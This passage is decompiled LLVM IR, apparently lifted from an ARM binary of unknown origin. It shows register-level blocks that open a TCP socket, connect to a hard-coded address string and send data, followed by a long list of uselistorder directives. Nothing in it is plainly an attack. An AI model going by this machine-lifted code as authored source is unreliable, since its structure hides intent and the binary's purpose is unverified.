dec_label_pc_110cc:                               ; preds = %dec_label_pc_110c0, %dec_label_pc_11180
  %v0_110cc = load i32, i32* @r6, align 4
  %v1_110cc = add i32 %v0_110cc, 4
  %v2_110cc = inttoptr i32 %v1_110cc to i32*
  %v3_110cc = load i32, i32* %v2_110cc, align 4
  store i32 %v3_110cc, i32* %r0.global-to-local, align 4
  %v1_110d0 = call i32 @close(i32 %v3_110cc)
  store i32 %v1_110d0, i32* %r0.global-to-local, align 4
  %v0_110d4 = load i32, i32* @r6, align 4
  %v1_110d4 = add i32 %v0_110d4, 284
  %v2_110d4 = inttoptr i32 %v1_110d4 to i8*
  %v3_110d4 = load i8, i8* %v2_110d4, align 1
  %v4_110d4 = zext i8 %v3_110d4 to i32
  %v1_110d8 = add nuw nsw i32 %v4_110d4, 1
  %v1_110dc = urem i32 %v1_110d8, 256
  store i32 %v1_110dc, i32* %r3.global-to-local, align 4
  %v2_110e0 = icmp ugt i32 %v1_110dc, 8
  store i1 %v2_110e0, i1* %cpsr_c.global-to-local, align 1
  %v7_110e0 = icmp eq i32 %v1_110dc, 9
  store i1 %v7_110e0, i1* %cpsr_z.global-to-local, align 1
  %v2_110e4 = xor i1 %v7_110e0, true
  %v3_110e4 = and i1 %v2_110e0, %v2_110e4
  br i1 %v3_110e4, label %bb377, label %bb378

bb377:                                            ; preds = %dec_label_pc_110cc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb378

bb378:                                            ; preds = %dec_label_pc_110cc, %bb377
  store i32 -1, i32* @r4, align 4
  %v1_110ec = trunc i32 %v1_110d8 to i8
  store i8 %v1_110ec, i8* %v2_110d4, align 1
  %v0_110f0 = load i32, i32* @r4, align 4
  %v1_110f0 = load i32, i32* @r6, align 4
  %v2_110f0 = add i32 %v1_110f0, 4
  %v3_110f0 = inttoptr i32 %v2_110f0 to i32*
  store i32 %v0_110f0, i32* %v3_110f0, align 4
  %v0_110f4 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_110f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_110f4 = xor i1 %v1_110f4, true
  %v3_110f4 = and i1 %v0_110f4, %v2_110f4
  br i1 %v3_110f4, label %bb379, label %.thread241

bb379:                                            ; preds = %bb378
  %v4_110f4 = load i32, i32* %r0.global-to-local, align 4
  %v5_110f4 = load i32, i32* @r6, align 4
  %v6_110f4 = add i32 %v5_110f4, 12
  %v7_110f4 = inttoptr i32 %v6_110f4 to i32*
  store i32 %v4_110f4, i32* %v7_110f4, align 4
  %v4_110f8 = load i32, i32* %r0.global-to-local, align 4
  %v5_110f8 = trunc i32 %v4_110f8 to i8
  %v6_110f8 = load i32, i32* @r6, align 4
  %v7_110f8 = add i32 %v6_110f8, 284
  %v8_110f8 = inttoptr i32 %v7_110f8 to i8*
  store i8 %v5_110f8, i8* %v8_110f8, align 1
  %v0_110fc.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_110fc.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread241

.thread241:                                       ; preds = %bb378, %bb379
  %v1_110fc = phi i1 [ %v1_110fc.pre, %bb379 ], [ %v1_110f4, %bb378 ]
  %v0_110fc = phi i1 [ %v0_110fc.pre, %bb379 ], [ %v0_110f4, %bb378 ]
  %v2_110fc = xor i1 %v1_110fc, true
  %v3_110fc = and i1 %v0_110fc, %v2_110fc
  br i1 %v3_110fc, label %dec_label_pc_105fc, label %dec_label_pc_11100

dec_label_pc_11100:                               ; preds = %.thread241
  %v0_11100 = load i32, i32* @r6, align 4
  store i32 %v0_11100, i32* @r0, align 4
  %v0_11104 = call i32 @function_f8e0()
  store i32 %v0_11104, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_105fc

dec_label_pc_1110c:                               ; preds = %dec_label_pc_10f7c
  store i32 %v2_10f4c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_1111c = add i32 %v0_10f68, 4
  %v2_1111c = inttoptr i32 %v1_1111c to i32*
  %v3_1111c = load i32, i32* %v2_1111c, align 4
  store i32 %v3_1111c, i32* %r0.global-to-local, align 4
  %v5_11120 = call i32 @send(i32 %v3_1111c, i32* nonnull %stack_var_-41, i32 3, i32 16384)
  store i32 %v5_11120, i32* %r0.global-to-local, align 4
  store i32 %v2_10590, i32* %r1.global-to-local, align 4
  %v0_11128 = load i32, i32* @r6, align 4
  %v1_11128 = add i32 %v0_11128, 4
  %v2_11128 = inttoptr i32 %v1_11128 to i32*
  %v3_11128 = load i32, i32* %v2_11128, align 4
  store i32 %v3_11128, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10920

dec_label_pc_11138:                               ; preds = %dec_label_pc_107d0
  store i32 %.pre, i32* %r0.global-to-local, align 4
  %v1_11140 = add i32 %v0_11138, 92
  store i32 %v1_11140, i32* %r1.global-to-local, align 4
  store i32 192, i32* %r2.global-to-local, align 4
  %v3_11148 = inttoptr i32 %.pre to i32*
  %v4_11148 = inttoptr i32 %v1_11140 to i32*
  %v5_11148 = call i32* @memmove(i32* %v3_11148, i32* %v4_11148, i32 192)
  %v7_11148 = ptrtoint i32* %v5_11148 to i32
  store i32 %v7_11148, i32* %r0.global-to-local, align 4
  %v0_1114c = load i32, i32* @r6, align 4
  %v1_1114c = add i32 %v0_1114c, 24
  %v2_1114c = inttoptr i32 %v1_1114c to i32*
  %v3_1114c = load i32, i32* %v2_1114c, align 4
  store i32 %v3_1114c, i32* %r3.global-to-local, align 4
  %v1_11150 = add i32 %v3_1114c, -64
  store i32 %v1_11150, i32* %ip.global-to-local, align 4
  store i32 %v1_11150, i32* %v2_1114c, align 4
  br label %dec_label_pc_107e0

dec_label_pc_1115c:                               ; preds = %dec_label_pc_10cb8
  %v0_1115c = load i32, i32* @r6, align 4
  store i32 %v0_1115c, i32* @r0, align 4
  %v0_11160 = call i32 @function_f8e0()
  store i32 %v0_11160, i32* %r0.global-to-local, align 4
  %v0_11164 = load i32, i32* @r6, align 4
  %v1_11164 = add i32 %v0_11164, 24
  %v2_11164 = inttoptr i32 %v1_11164 to i32*
  %v3_11164 = load i32, i32* %v2_11164, align 4
  store i32 %v3_11164, i32* %ip.global-to-local, align 4
  %v0_11168 = load i32, i32* @r4, align 4
  store i32 %v0_11168, i32* @r7, align 4
  br label %dec_label_pc_10d00

dec_label_pc_11170:                               ; preds = %thread-pre-split100
  %v0_11178 = load i32, i32* @r6, align 4
  %v1_11178 = add i32 %v0_11178, 12
  %v2_11178 = inttoptr i32 %v1_11178 to i32*
  %v3_11178 = load i32, i32* %v2_11178, align 4
  br label %dec_label_pc_107c8.backedge

dec_label_pc_11180:                               ; preds = %dec_label_pc_110b4
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_11184 = load i32, i32* @sb, align 4
  %v2_11184 = inttoptr i32 %v1_11184 to i32*
  store i32 104, i32* %v2_11184, align 4
  br label %dec_label_pc_110cc

dec_label_pc_1118c:                               ; preds = %dec_label_pc_106e4, %dec_label_pc_1069c
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11190

dec_label_pc_11190:                               ; preds = %dec_label_pc_1070c, %dec_label_pc_1118c
  %v0_11198 = phi i32 [ 0, %dec_label_pc_1118c ], [ %v0_106ec, %dec_label_pc_1070c ]
  %v0_11190 = load i32, i32* @r6, align 4
  %v1_11190 = add i32 %v0_11190, 4
  %v2_11190 = inttoptr i32 %v1_11190 to i32*
  %v3_11190 = load i32, i32* %v2_11190, align 4
  store i32 %v3_11190, i32* %r4.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_11198 = inttoptr i32 %v0_11190 to i32*
  store i32 %v0_11198, i32* %v2_11198, align 4
  %v0_1119c = load i32, i32* %ip.global-to-local, align 4
  %v1_1119c = load i32, i32* @r6, align 4
  %v2_1119c = add i32 %v1_1119c, 24
  %v3_1119c = inttoptr i32 %v2_1119c to i32*
  store i32 %v0_1119c, i32* %v3_1119c, align 4
  %v0_105d4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_105d4

dec_label_pc_111a4:                               ; preds = %dec_label_pc_1065c
  %v0_111a4 = load i32, i32* @r6, align 4
  %v1_111a4 = add i32 %v0_111a4, 4
  %v2_111a4 = inttoptr i32 %v1_111a4 to i32*
  %v3_111a4 = load i32, i32* %v2_111a4, align 4
  store i32 %v3_111a4, i32* %r0.global-to-local, align 4
  %v1_111a8 = call i32 @close(i32 %v3_111a4)
  store i32 %v1_111a8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v0_111b0 = load i32, i32* @r5, align 4
  %v1_111b0 = load i32, i32* @r6, align 4
  %v2_111b0 = add i32 %v1_111b0, 12
  %v3_111b0 = inttoptr i32 %v2_111b0 to i32*
  store i32 %v0_111b0, i32* %v3_111b0, align 4
  %v0_111b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_111b4 = load i32, i32* @r6, align 4
  %v2_111b4 = add i32 %v1_111b4, 4
  %v3_111b4 = inttoptr i32 %v2_111b4 to i32*
  store i32 %v0_111b4, i32* %v3_111b4, align 4
  %v0_111b8 = load i32, i32* @r5, align 4
  %v1_111b8 = trunc i32 %v0_111b8 to i8
  %v2_111b8 = load i32, i32* @r6, align 4
  %v3_111b8 = add i32 %v2_111b8, 284
  %v4_111b8 = inttoptr i32 %v3_111b8 to i8*
  store i8 %v1_111b8, i8* %v4_111b8, align 1
  br label %dec_label_pc_105fc

dec_label_pc_111c0:                               ; preds = %dec_label_pc_10784
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_111c4 = call i32 @function_11294(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_111cc = call i32 @function_11294(i32 27)
  store i32 %v1_111cc, i32* %r0.global-to-local, align 4
  %v0_111d0 = load i32, i32* @r6, align 4
  %v1_111d0 = add i32 %v0_111d0, 12
  %v2_111d0 = inttoptr i32 %v1_111d0 to i32*
  %v3_111d0 = load i32, i32* %v2_111d0, align 4
  br label %dec_label_pc_107c8.backedge

dec_label_pc_107c8.backedge.thread:               ; preds = %dec_label_pc_10aa0, %dec_label_pc_10bc8, %dec_label_pc_10d24, %dec_label_pc_10dd8, %dec_label_pc_10e8c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_107d0

dec_label_pc_107c8.backedge.thread501:            ; preds = %dec_label_pc_10acc, %dec_label_pc_10bf4, %dec_label_pc_10eb8, %dec_label_pc_10d50, %dec_label_pc_10e04, %dec_label_pc_10ae8, %dec_label_pc_10c10, %dec_label_pc_10d6c, %dec_label_pc_10e20, %dec_label_pc_10ed4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_107d0

dec_label_pc_107c8.backedge:                      ; preds = %dec_label_pc_111c0, %dec_label_pc_11170
  %storemerge503 = phi i32 [ %v3_11178, %dec_label_pc_11170 ], [ %v3_111d0, %dec_label_pc_111c0 ]
  %v0_107c8.be = phi i32 [ %v3_11178, %dec_label_pc_11170 ], [ %v3_111d0, %dec_label_pc_111c0 ]
  %v0_107d0158 = phi i32 [ %v0_11178, %dec_label_pc_11170 ], [ %v0_111d0, %dec_label_pc_111c0 ]
  store i32 %storemerge503, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_107c8 = icmp eq i32 %v0_107c8.be, 0
  store i1 %v2_107c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_107c8, label %dec_label_pc_105fc, label %dec_label_pc_107d0

dec_label_pc_111d8:                               ; preds = %bb376
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_111e4 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_111e4, i32* %r0.global-to-local, align 4
  %v2_111e8 = icmp eq i32 %v3_111e4, -1
  store i1 %v2_111e8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_111e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_111e4, i32* @r4, align 4
  br i1 %v2_111e8, label %dec_label_pc_103fc, label %dec_label_pc_111f4

dec_label_pc_111f4:                               ; preds = %dec_label_pc_111d8
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_111f8 = call i32 @function_1134c(i32 2)
  store i32 2, i32* @r6, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1202c.134 to i32), i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_1120c = call i32 @inet_addr(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1202c.134, i32 0, i32 0))
  %v0_11210 = load i32, i32* @r5, align 4
  store i32 %v0_11210, i32* %r1.global-to-local, align 4
  %v0_11218 = load i32, i32* @r6, align 4
  store i32 %v0_11218, i32* %r0.global-to-local, align 4
  %v2_1121c = inttoptr i32 %v0_11210 to i32*
  %v3_1121c = call i32 @function_11268(i32 %v0_11218, i32* %v2_1121c)
  %v4_1121c = inttoptr i32 %v3_1121c to i8*
  store i32 %v3_1121c, i32* %r0.global-to-local, align 4
  %v2_11220 = add i32 %v3_1121c, 1
  %v3_11220 = inttoptr i32 %v2_11220 to i8*
  %v4_11220 = load i8, i8* %v3_11220, align 1
  %v5_11220 = zext i8 %v4_11220 to i32
  store i32 %v5_11220, i32* %r2.global-to-local, align 4
  %v3_11224 = load i8, i8* %v4_1121c, align 1
  %v4_11224 = zext i8 %v3_11224 to i32
  %v4_11228 = mul nuw nsw i32 %v5_11220, 256
  %v5_11228 = or i32 %v4_11224, %v4_11228
  store i32 %v5_11228, i32* %r3.global-to-local, align 4
  %v1_1122c = and i32 %v4_11224, 128
  %v2_1122c = icmp ne i32 %v1_1122c, 0
  store i1 %v2_1122c, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_11220, i32* %r1.global-to-local, align 4
  %v0_11230 = load i32, i32* @r6, align 4
  store i32 %v0_11230, i32* %r0.global-to-local, align 4
  %v1_1123c = call i32 @function_11294(i32 %v0_11230)
  %v0_11240 = load i32, i32* @r4, align 4
  store i32 %v0_11240, i32* %r0.global-to-local, align 4
  store i32 %v2_10184, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v5_1124c = call i32 @connect(i32 %v0_11240, %sockaddr* %tmp298, i32 16)
  store i32 %v5_1124c, i32* %r0.global-to-local, align 4
  %v3_11250 = icmp eq i32 %v5_1124c, -1
  store i1 %v3_11250, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_11250, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11250, label %dec_label_pc_11258, label %dec_label_pc_10358

dec_label_pc_11258:                               ; preds = %dec_label_pc_111f4
  %v0_11258 = load i32, i32* @r4, align 4
  store i32 %v0_11258, i32* %r0.global-to-local, align 4
  %v1_1125c = call i32 @close(i32 %v0_11258)
  %v0_11260 = load i32, i32* @r5, align 4
  store i32 %v0_11260, i32* %r0.global-to-local, align 4
  call void @exit(i32 %v0_11260)
  unreachable

; uselistorder directives
  uselistorder i1 %v3_11250, { 1, 0, 2 }
  uselistorder i32 %v4_11224, { 1, 0 }
  uselistorder i32 %v5_11220, { 1, 0, 2 }
  uselistorder i32 %v3_111d0, { 1, 0 }
  uselistorder i32 %v3_11178, { 1, 0 }
  uselistorder i1 %v1_110f4, { 1, 0 }
  uselistorder i32 %v1_110dc, { 2, 1, 0 }
  uselistorder i32 %v1_110d8, { 1, 0 }
  uselistorder i1 %v3_110b8, { 1, 0, 2 }
  uselistorder i1 %v2_11090, { 1, 0 }
  uselistorder i32 %.385, { 1, 0 }
  uselistorder i1 %v2_11078, { 1, 0 }
  uselistorder i32 %v0_11074, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11054, { 1, 0, 2 }
  uselistorder i32 %v4_11050, { 1, 0, 2 }
  uselistorder i32 %v0_11040, { 2, 1, 3, 0 }
  uselistorder i1 %v3_10ff0, { 1, 0, 2 }
  uselistorder i32 %v0_10ff0, { 1, 0 }
  uselistorder i1 %v0_10fe0, { 1, 0 }
  uselistorder i32 %v4_10fd4, { 1, 0, 2 }
  uselistorder i32 %v0_10f68, { 1, 2, 0 }
  uselistorder i1 %v7_10ed8, { 1, 0 }
  uselistorder i32 %v1_10ed4, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_10ecc, { 1, 0 }
  uselistorder i8 %v3_10ec4, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10ed4, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_10eb0, { 1, 0 }
  uselistorder i1 %v7_10ea8, { 1, 0 }
  uselistorder i1 %v7_10ea0, { 1, 0 }
  uselistorder i1 %v7_10e24, { 1, 0 }
  uselistorder i32 %v1_10e20, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_10e18, { 1, 0 }
  uselistorder i8 %v3_10e10, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10e20, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_10dfc, { 1, 0 }
  uselistorder i1 %v7_10df4, { 1, 0 }
  uselistorder i1 %v7_10dec, { 1, 0 }
  uselistorder i1 %v7_10d70, { 1, 0 }
  uselistorder i32 %v1_10d6c, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_10d64, { 1, 0 }
  uselistorder i8 %v3_10d5c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10d6c, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_10d48, { 1, 0 }
  uselistorder i1 %v7_10d40, { 1, 0 }
  uselistorder i1 %v7_10d38, { 1, 0 }
  uselistorder i32 %v0_10d14, { 1, 2, 0 }
  uselistorder i32 %v2_10d00, { 1, 0 }
  uselistorder i32 %v1_10d00, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_10d00, { 3, 2, 5, 0, 1, 4, 6 }
  uselistorder i32 %v1_10cd0, { 2, 1, 0 }
  uselistorder i1 %v7_10c14, { 1, 0 }
  uselistorder i32 %v1_10c10, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_10c08, { 1, 0 }
  uselistorder i8 %v3_10c00, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10c10, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_10bec, { 1, 0 }
  uselistorder i1 %v7_10be4, { 1, 0 }
  uselistorder i1 %v7_10bdc, { 1, 0 }
  uselistorder i1 %v7_10aec, { 1, 0 }
  uselistorder i32 %v1_10ae8, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_10ae0, { 1, 0 }
  uselistorder i8 %v3_10ad8, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10ae8, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_10ac4, { 1, 0 }
  uselistorder i1 %v7_10abc, { 1, 0 }
  uselistorder i1 %v7_10ab4, { 1, 0 }
  uselistorder i32 %v0_10a5c, { 2, 1, 0 }
  uselistorder i1 %v7_10a4c, { 1, 0 }
  uselistorder i1 %v8_10a40, { 1, 0 }
  uselistorder i8 %v3_10a38, { 4, 5, 6, 7, 8, 3, 2, 1, 0 }
  uselistorder i32 %v0_10a48, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_10a24, { 1, 0 }
  uselistorder i1 %v7_10a1c, { 1, 0 }
  uselistorder i32 %v0_109c4, { 2, 1, 0 }
  uselistorder i1 %v7_109ac, { 1, 0 }
  uselistorder i1 %v8_109a0, { 1, 0 }
  uselistorder i8 %v3_10998, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_109a8, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_10984, { 1, 0 }
  uselistorder i1 %v7_1097c, { 1, 0 }
  uselistorder i1 %v7_10974, { 1, 0 }
  uselistorder i32 %v0_10940, { 0, 2, 1 }
  uselistorder i32 %v1_10938, { 1, 0 }
  uselistorder i32 %v1_10934, { 1, 0 }
  uselistorder i32 %v1_1092c, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_10928, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_10928, { 0, 2, 1 }
  uselistorder i1 %v7_108c8, { 1, 0 }
  uselistorder i1 %v2_108b4, { 1, 0, 2 }
  uselistorder i1 %v2_1089c, { 1, 0, 2 }
  uselistorder i32 %v1_108bc, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_10890, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v1_108b8, { 1, 0 }
  uselistorder i32 %v2_108c0, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v3_1087c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10844, { 3, 16, 4, 18, 5, 17, 6, 15, 7, 14, 8, 13, 9, 12, 2, 10, 11, 19, 1, 0 }
  uselistorder i32 %v1_10820, { 1, 2, 3, 0 }
  uselistorder i32 %v3_1081c, { 1, 0 }
  uselistorder i32 %v5_10800, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32 %v2_107ec, { 1, 0, 2 }
  uselistorder i32 %v3_107e8, { 1, 0, 2 }
  uselistorder i32 %v0_11138, { 1, 0, 2 }
  uselistorder i1 %v3_107bc, { 1, 0, 2 }
  uselistorder i1 %v7_1079c, { 1, 0 }
  uselistorder i1 %v7_10774, { 1, 0 }
  uselistorder i32 %v0_106ec, { 0, 3, 2, 4, 6, 5, 1 }
  uselistorder i32 %v2_106c0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_106b8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_1064c, { 2, 1, 0 }
  uselistorder i32 %v3_10648, { 1, 0 }
  uselistorder i32 %v3_10628, { 4, 3, 1, 0, 5, 6, 2 }
  uselistorder i32 %v0_1061c, { 1, 0 }
  uselistorder i32 %v1_10600, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_105ec, { 2, 1, 0 }
  uselistorder i32 %v3_105e8, { 1, 0 }
  uselistorder i32 %v0_105ec, { 1, 0 }
  uselistorder i32 %v1_10584, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10584, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10554, { 2, 1, 0 }
  uselistorder i32 %v1_10550, { 1, 0 }
  uselistorder i32 %v0_10520, { 0, 2, 1 }
  uselistorder i32 %v1_10518, { 1, 0 }
  uselistorder i1 %v7_104d0, { 0, 3, 1, 2 }
  uselistorder i1 %v2_104d0, { 1, 2, 0 }
  uselistorder i32 %v2_104c8, { 0, 3, 4, 2, 1 }
  uselistorder i32 %v0_104c0, { 1, 0 }
  uselistorder i32 %v1_104a4, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_10498, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10498, { 0, 2, 1 }
  uselistorder i32 %v1_10488, { 1, 0 }
  uselistorder i32 %v3_104fc, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %storemerge245, { 1, 0, 2 }
  uselistorder i32 %v3_10344, { 1, 0 }
  uselistorder i32 %v1_10330, { 1, 0 }
  uselistorder i32 %v1_10318, { 1, 2, 0 }
  uselistorder i32 %v0_10324, { 0, 3, 2, 1 }
  uselistorder i32 %v0_102e8, { 2, 1, 0, 3, 5, 4 }
  uselistorder i32 %v2_102dc, { 2, 1, 0 }
  uselistorder i32 %v1_102b8, { 3, 1, 0, 4, 2 }
  uselistorder i1 %v2_10290, { 1, 0 }
  uselistorder i32 %v0_101f4, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1019c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v4_100c0, { 1, 0 }
  uselistorder i32 %v1_100bc, { 1, 0 }
  uselistorder i32 %v4_10098, { 1, 0 }
  uselistorder i1 %v2_ffe8, { 1, 0 }
  uselistorder i1 %v2_ffd4, { 1, 0 }
  uselistorder i1 %v2_ffc0, { 1, 0 }
  uselistorder i32 %.384, { 3, 2, 1, 0 }
  uselistorder i1 %v7_ff9c, { 2, 1, 0, 5, 4, 3 }
  uselistorder i1 %v2_ff84, { 1, 0 }
  uselistorder i1 %v3_ff68, { 1, 0, 2 }
  uselistorder i1 %v2_ff54, { 1, 0 }
  uselistorder i1 %v2_ff30, { 1, 0 }
  uselistorder i32 %v1_fee0, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 31, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fecc, { 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 30, 31, 32, 54, 29, 28, 53, 27, 26, 25, 24, 23, 22, 20, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_fec8, { 4, 5, 6, 7, 0, 8, 1, 2, 3, 9 }
  uselistorder i32 %v4_feb8, { 1, 0 }
  uselistorder i32 %v0_fea8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_fe84, { 1, 0 }
  uselistorder i32 %v2_10c30, { 2, 3, 1, 0 }
  uselistorder i32 %v2_10738, { 3, 7, 4, 5, 2, 6, 8, 9, 1, 0 }
  uselistorder i32 %v2_10f5c, { 1, 0 }
  uselistorder i32 %v2_1050c, { 0, 4, 1, 5, 2, 7, 3, 6 }
  uselistorder i32 %v2_fe70, { 1, 2, 4, 5, 0, 3, 8, 7, 6, 9 }
  uselistorder i32 %v2_fe6c, { 3, 2, 0, 5, 4, 1, 6 }
  uselistorder i32 %v4_fd50, { 1, 0 }
  uselistorder i32 %v3_fd10, { 1, 0 }
  uselistorder i32 %v4_fcfc, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32 %v0_fce4, { 0, 2, 1 }
  uselistorder i32 %v0_fc8c, { 3, 2, 0, 1 }
  uselistorder i32 %v3_fc24, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_fc0c, { 0, 2, 1 }
  uselistorder i32 %v0_fbf4, { 2, 1, 0 }
  uselistorder i32 %v0_fbd0, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %storemerge252, { 1, 0 }
  uselistorder i32 %v0_fb64, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 14, 12, 13 }
  uselistorder i32* %stack_var_-92, { 1, 2, 3, 0, 4 }
  uselistorder i32* %stack_var_-56, { 10, 7, 11, 3, 12, 6, 13, 5, 14, 8, 15, 4, 16, 17, 1, 2, 9, 18, 0, 19, 20 }
  uselistorder i32* %stack_var_-48, { 4, 5, 3, 6, 2, 7, 0, 8, 1, 9 }
  uselistorder i32* %stack_var_-38, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %sp.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %sl.global-to-local, { 4, 9, 10, 11, 12, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32* %r8.global-to-local, { 0, 5, 6, 9, 1, 8, 7, 4, 10, 2, 3, 11, 12, 13 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 12, 37, 36, 127, 38, 39, 116, 13, 14, 15, 117, 128, 129, 130, 131, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 118, 119, 120, 121, 122, 123, 141, 142, 143, 124, 125, 126, 132, 133, 134, 135, 136, 137, 138, 139, 140, 40, 41, 42, 43, 44, 45, 27, 28, 46, 47, 49, 48, 50, 51, 52, 53, 55, 57, 56, 54, 58, 59, 60, 61, 67, 62, 63, 64, 65, 68, 147, 148, 69, 145, 146, 29, 30, 31, 32, 33, 34, 35, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 115, 87, 88, 89, 90, 91, 144, 92, 93, 95, 94, 97, 96, 98, 100, 99, 102, 101, 66, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114 }
  uselistorder i32* %r2.global-to-local, { 9, 10, 11, 128, 33, 116, 12, 13, 14, 15, 16, 112, 117, 118, 119, 120, 0, 1, 2, 3, 5, 4, 6, 8, 7, 124, 17, 18, 20, 19, 21, 22, 23, 113, 115, 114, 125, 127, 126, 121, 122, 123, 34, 35, 36, 37, 38, 39, 40, 24, 25, 41, 42, 43, 44, 45, 47, 49, 48, 111, 46, 50, 51, 52, 53, 54, 58, 55, 56, 57, 59, 61, 63, 62, 60, 64, 26, 27, 28, 29, 30, 31, 32, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 81, 82, 79, 80, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
